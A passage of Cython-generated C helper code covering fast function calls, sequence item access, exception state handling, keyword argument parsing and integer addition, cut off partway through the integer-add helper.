    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* PyObjectCall2Args */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args, *result = NULL;
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
    #endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
    Py_DECREF(function);
done:
    return result;
}

/* PyObjectCallNoArg */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

/* GetItemInt */
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (!j) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;
        if (likely(m && m->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {
                Py_ssize_t l = m->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return m->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}

/* DictGetItem */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key) {
    PyObject *value;
    value = PyDict_GetItemWithError(d, key);
    if (unlikely(!value)) {
        if (!PyErr_Occurred()) {
            if (unlikely(PyTuple_Check(key))) {
                PyObject* args = PyTuple_Pack(1, key);
                if (likely(args)) {
                    PyErr_SetObject(PyExc_KeyError, args);
                    Py_DECREF(args);
                }
            } else {
                PyErr_SetObject(PyExc_KeyError, key);
            }
        }
        return NULL;
    }
    Py_INCREF(value);
    return value;
}
#endif

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

/* PyErrExceptionMatches */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    PyObject *exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
    if (unlikely(PyTuple_Check(err)))
        return __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    return __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* SwapException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
    #endif
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif

/* RaiseTooManyValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected) {
    PyErr_Format(PyExc_ValueError,
                 "too many values to unpack (expected %" CYTHON_FORMAT_SSIZE_T "d)", expected);
}

/* RaiseNeedMoreValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index) {
    PyErr_Format(PyExc_ValueError,
                 "need more than %" CYTHON_FORMAT_SSIZE_T "d value%.1s to unpack",
                 index, (index == 1) ? "" : "s");
}

/* IterFinish */
static CYTHON_INLINE int __Pyx_IterFinish(void) {
#if CYTHON_FAST_THREAD_STATE
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject* exc_type = tstate->curexc_type;
    if (unlikely(exc_type)) {
        if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) {
            PyObject *exc_value, *exc_tb;
            exc_value = tstate->curexc_value;
            exc_tb = tstate->curexc_traceback;
            tstate->curexc_type = 0;
            tstate->curexc_value = 0;
            tstate->curexc_traceback = 0;
            Py_DECREF(exc_type);
            Py_XDECREF(exc_value);
            Py_XDECREF(exc_tb);
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#else
    if (unlikely(PyErr_Occurred())) {
        if (likely(PyErr_ExceptionMatches(PyExc_StopIteration))) {
            PyErr_Clear();
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#endif
}

/* UnpackItemEndCheck */
static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected) {
    if (unlikely(retval)) {
        Py_DECREF(retval);
        __Pyx_RaiseTooManyValuesError(expected);
        return -1;
    }
    return __Pyx_IterFinish();
}

/* JoinPyUnicode */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      CYTHON_UNUSED Py_UCS4 max_char) {
#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    PyObject *result_uval;
    int result_ukind;
    Py_ssize_t i, char_pos;
    void *result_udata;
#if CYTHON_PEP393_ENABLED
    result_uval = PyUnicode_New(result_ulength, max_char);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;
    result_udata = PyUnicode_DATA(result_uval);
#else
    result_uval = PyUnicode_FromUnicode(NULL, result_ulength);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = sizeof(Py_UNICODE);
    result_udata = PyUnicode_AS_UNICODE(result_uval);
#endif
    char_pos = 0;
    for (i=0; i < value_count; i++) {
        int ukind;
        Py_ssize_t ulength;
        void *udata;
        PyObject *uval = PyTuple_GET_ITEM(value_tuple, i);
        if (unlikely(__Pyx_PyUnicode_READY(uval)))
            goto bad;
        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);
        if (unlikely(!ulength))
            continue;
        if (unlikely(char_pos + ulength < 0))
            goto overflow;
        ukind = __Pyx_PyUnicode_KIND(uval);
        udata = __Pyx_PyUnicode_DATA(uval);
        if (!CYTHON_PEP393_ENABLED || ukind == result_ukind) {
            memcpy((char *)result_udata + char_pos * result_ukind, udata, (size_t) (ulength * result_ukind));
        } else {
            #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030300F0 || defined(_PyUnicode_FastCopyCharacters)
            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);
            #else
            Py_ssize_t j;
            for (j=0; j < ulength; j++) {
                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);
                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos+j, uchar);
            }
            #endif
        }
        char_pos += ulength;
    }
    return result_uval;
overflow:
    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");
bad:
    Py_DECREF(result_uval);
    return NULL;
#else
    result_ulength++;
    value_count++;
    return PyUnicode_Join(__pyx_empty_unicode, value_tuple);
#endif
}

/* RaiseArgTupleInvalid */
static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char *more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    } else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
                 func_name, more_or_less, num_expected,
                 (num_expected == 1) ? "" : "s", num_found);
}

/* RaiseDoubleKeywords */
static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
        #if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
        #else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
        #endif
}

/* ParseKeywords */
static int __Pyx_ParseOptionalKeywords(
    PyObject *kwds,
    PyObject **argnames[],
    PyObject *kwds2,
    PyObject *values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject *key = 0, *value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    while (PyDict_Next(kwds, &pos, &key, &value)) {
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name-argnames] = value;
            continue;
        }
        name = first_kw_arg;
        #if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**name, key)) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                            (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                             && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        } else
        #endif
        if (likely(PyUnicode_Check(key))) {
            while (*name) {
                int cmp = (**name == key) ? 0 :
                #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                    (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                #endif
                    PyUnicode_Compare(**name, key);
                if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                if (cmp == 0) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    int cmp = (**argname == key) ? 0 :
                    #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                    #endif
                        PyUnicode_Compare(**argname, key);
                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) goto arg_passed_twice;
                    argname++;
                }
            }
        } else
            goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        } else {
            goto invalid_keyword;
        }
    }
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    PyErr_Format(PyExc_TypeError,
    #if PY_MAJOR_VERSION < 3
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
bad:
    return -1;
}

/* PyIntBinop */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, int inplace, int zerodivision_check) {
    (void)inplace;
    (void)zerodivision_check;
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
            x = (long)((unsigned long)a + b);
            if (likely((x^a) >= 0 || (x^b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_add(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        const Py_ssize_t size = Py_SIZE(op1);
        if (likely(__Pyx_sst_abs(size) <= 1)) {
            a = likely(size) ? digits[0] : 0;
            if (size == -1) a = -a;
        } else {
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
